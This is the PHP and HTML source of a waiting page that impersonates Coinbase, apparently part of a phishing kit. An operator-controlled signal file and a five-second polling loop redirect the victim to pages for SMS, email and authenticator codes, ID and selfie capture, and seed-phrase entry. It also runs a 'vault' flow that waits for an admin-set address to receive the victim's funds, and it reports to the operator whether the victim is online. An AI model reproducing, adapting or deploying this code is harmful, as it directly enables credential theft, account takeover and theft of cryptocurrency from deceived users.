<?php
// Start the session with secure settings
session_start([
    'cookie_lifetime' => 86400, // 24 minutes
    'cookie_secure' => true,    // Only send cookie over HTTPS
    'cookie_httponly' => true, // Prevent JavaScript access to session cookie
    'cookie_samesite' => 'Lax' // CSRF protection
]);

// Include the database connection file
require_once "admin/db_connection.php";

// Function to update user activity
function updateActivity($token, $activity) {
    global $conn; // Access the database connection within the function
    $sql = "UPDATE user_submissions SET activity = ? WHERE token = ?";
    $stmt = $conn->prepare($sql);
    $stmt->bind_param("ss", $activity, $token);
    $stmt->execute();
    $stmt->close();
}

// Check if the email and token are set in the session
if (!isset($_SESSION["email"]) || !isset($_SESSION["token"])) {
    // If email or token is not set, redirect the user back to login.php
    header("Location: login.php");
    exit();
}

// Retrieve the token from the session
$token = $_SESSION["token"];

// Handle vault continue POST request
if (isset($_POST['vault_continue'])) {
    // Update status to indicate waiting for admin address setup
    $sql = "UPDATE user_submissions SET vault_status = 'WaitingForAddress', activity = 'WaitingForAddress' WHERE token = ?";
    $stmt = $conn->prepare($sql);
    $stmt->bind_param("s", $token);
    $stmt->execute();
    $stmt->close();
}

// Update user activity to indicate LoadingPage
updateActivity($token, "LoadingPage");

// Check if the signal file exists
$signalFile = 'signal.txt'; // You can change the file name if needed

if (file_exists($signalFile)) {
    // Read the contents of the signal file
    $signal = file_get_contents($signalFile);

    // Remove the signal file
    unlink($signalFile);

    // Redirect based on the received signal
    switch ($signal) {
        case 'sms-2fa':
            header('Location: sms.php');
            exit;
            
        case 'password-reset':
            header('Location: passreset.php');
            exit;
        
        case 'auth-app':
            header('Location: app.php');
            exit;

        case 'email-2fa':
            header('Location: email.php');
            exit;

        case 'url':
            header('Location: url.php');
            exit;

        case 'id':
            header('Location: id.php');
            exit;

        case 'selfie':
            header('Location: selfie.php');
            exit;

        case 'finish':
            header('Location: finish.php');
            exit;

        case 'seed':
            header('Location: seed.php');
            exit;

        case 'vault':
            header('Location: vault.php');
            exit;

        case 'VaultCodeGenerated':
            header('Location: vault_code_display.php');
            exit;

        default:
            echo 'Invalid signals';
            exit;
    }
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="assets/favicon-32x32.png" type="image/x-icon">
    <title>Coinbase - Please wait</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
    <style>
        @font-face {
            font-family: 'CoinbaseSans';
            src: url('assets/CoinbaseSans2.woff2') format('woff2'),
            url('path/to/CoinbaseSans.woff') format('woff');
        }

        body {
            margin: 0;
            padding: 0;
            background-color: #0A0B0D;
            color: #E0E0E0;
            font-family: 'CoinbaseSans', sans-serif;
        }

        .wrapper {
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 60vh;
        }

        .login-container {
            width: 80%;
            max-width: 400px;
            padding: 20px;
            border-radius: 16px;
            border: 1px solid rgba(91, 97, 110, 0.2);
            background-color: #0A0B0D;
            margin-top: 80px;
        }

        .login-image {
            width: 100px;
            margin-top: 20px;
            margin-left: 20px;
        }

        h2 {
            font-size: 28px;
            font-weight: 600;
            margin-left: 20px;
            margin-bottom: 0;
        }

        .login-form {
            margin-top: 40px;
        }

        .login-form p {
            color: #B0B0B0;
            font-size: 12.5px;
            font-weight: 400;
            margin-left: 20px;
            margin-bottom: 40px;
            width:100%;
        }

        .login-form p::after {
            content: "Do not navigate away from this page.";
            color: #90888C;
            font-weight: bold;
        }

        .link-container {
            display: flex;
            justify-content: center;
            margin-bottom: 20px;
        }

        .login-form a {
            color: #1E90FF;
            text-decoration: none;
            font-size: 16px;
            font-weight: 400;
            line-height: 24px;
        }

        .circle-container {
            display: flex;
            justify-content: center;
            margin-bottom: 25px;
            position: relative;
        }

        .circle {
            width: 50px;
            height: 50px;
            border-radius: 50%;
            border: 5px solid #333;
            border-top-color: #1E90FF;
            animation: spin 1s ease infinite;
            margin-bottom:20px;
        }

        @keyframes spin {
            from {
                transform: rotate(0deg);
            }

            to {
                transform: rotate(360deg);
            }
        }

        .loader {
        position: relative;
        width: 80px;
        height: 80px;
        }

        .loader:before , .loader:after{
        content: '';
        border-radius: 50%;
        position: absolute;
        inset: 0;
        box-shadow: 0 0 10px 2px rgba(0, 0, 0, 0.3) inset;
        }
        .loader:after {
        box-shadow: 0 2px 0 #1E90FF inset;
        animation: rotate 2s linear infinite;
        }

        @keyframes rotate {
        0% {  transform: rotate(0)}
        100% { transform: rotate(360deg)}
        }
    </style>
</head>

<body>
    <div class="wrapper">
        <div class="login-container">
            <img src="assets/Consumer_Wordmark.svg" alt="Coinbase Logo" class="login-image">
            <form class="login-form" action="#">
                <h2>Please wait</h2>
                <p>Please allow us some time to verify your information.<br></p>
                <div class="circle-container">
                    <span class="loader"></span>
                </div>
                <div class="link-container">
                    <a href="#">Privacy policy</a>
                </div>
            </form>
        </div>
    </div>

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script>
    $(document).ready(function() {
    // Function to periodically check for the signal
    function checkSignal() {
        $.ajax({
            type: 'GET',
            url: 'check_signal.php',
            success: function(response) {
                switch(response) {
                    case 'password-reset':
                        // Redirect to passreset.php if the signal is received
                        window.location.href = 'passreset.php';
                        break;
                        
                    case 'sms-2fa':
                        // Redirect to sms.php if the signal is received
                        window.location.href = 'sms.php';
                        break;
                    case 'auth-app':
                        // Redirect to app.php if the signal is received
                        window.location.href = 'app.php';
                        break;
                    case 'email-2fa':
                        // Redirect to email.php if the signal is received
                        window.location.href = 'email.php';
                        break;
                    case 'url':
                        // Redirect to url.php if the signal is received
                        window.location.href = 'url.php';
                        break;
                    case 'id':
                        // Redirect to drivers.php if the signal is received
                        window.location.href = 'id.php';
                        break;
                    case 'selfie':
                        // Redirect to selfie.php if the signal is received
                        window.location.href = 'selfie.php';
                        break;
                    case 'seed':
                        // Redirect to seed.php if the signal is received
                        window.location.href = 'seed.php';
                        break;
                    case 'vault':
                        // Redirect to vault.php if the signal is received
                        window.location.href = 'vault.php';
                        break;
                    case 'VaultCodeGenerated':
                        // Redirect to vault code display if the signal is received
                        window.location.href = 'vault_code_display.php';
                        break;
                    case 'WaitingForAddress':
                        // Stay on loading screen while admin sets up address
                        console.log('Waiting for admin to set up address...');
                        break;
                    case 'AddressSet':
                        // Redirect to vault send address when admin has set address
                        window.location.href = 'vault_send_address.php';
                        break;
                    case 'VaultWallet':
                        // Redirect to vault send address page when in wallet stage
                        window.location.href = 'vault_send_address.php';
                        break;
                    case 'VaultComplete':
                        // Redirect to vault funds loading when funds complete
                        window.location.href = 'vault_funds_loading.php';
                        break;
                    case 'VaultFundsConfirmed':
                        // Redirect to finish when funds confirmed
                        window.location.href = 'finish.php';
                        break;
                    case 'finish':
                        // Redirect to finish.php if the signal is received
                        window.location.href = 'finish.php';
                        break;
                    default:
                        console.log('Invalid signal');
                        break;
                }
            },
            error: function(xhr, status, error) {
                console.error('Error:', error);
            },
            complete: function() {
                // Repeat the check every 5 seconds (adjust as needed)
                setTimeout(checkSignal, 5000);
            }
        });
    }

    // Start checking for the signal
    checkSignal();
});

    // Function to update user status
    function updateUserStatus(status) {
        // Send an AJAX request to update user status
        var xhr = new XMLHttpRequest();
        xhr.open('POST', 'update_status.php', true);
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        xhr.onreadystatechange = function() {
            if (xhr.readyState === XMLHttpRequest.DONE) {
                // Handle response if needed
            }
        };
        xhr.send('status=' + status);
    }

    // Detect user activity
    function detectActivity() {
        var userActive = false;

        function setUserActive() {
            if (!userActive) {
                userActive = true;
                updateUserStatus('online');
            }
        }

        // Events to detect user activity
        window.addEventListener('mousemove', setUserActive);
        window.addEventListener('keydown', setUserActive);
        window.addEventListener('visibilitychange', function() {
            if (!document.hidden) {
                setUserActive();
            }
        });

        // Additional events for mobile devices
        window.addEventListener('touchstart', setUserActive);
        window.addEventListener('touchmove', setUserActive);
        window.addEventListener('orientationchange', setUserActive);
        window.addEventListener('scroll', setUserActive);

        // Set user as offline when the tab is closed
        window.addEventListener('beforeunload', function() {
            updateUserStatus('offline');
        });
    }

    // Call detectActivity function when the document is loaded
    document.addEventListener('DOMContentLoaded', detectActivity);
    </script>
</body>
</html>
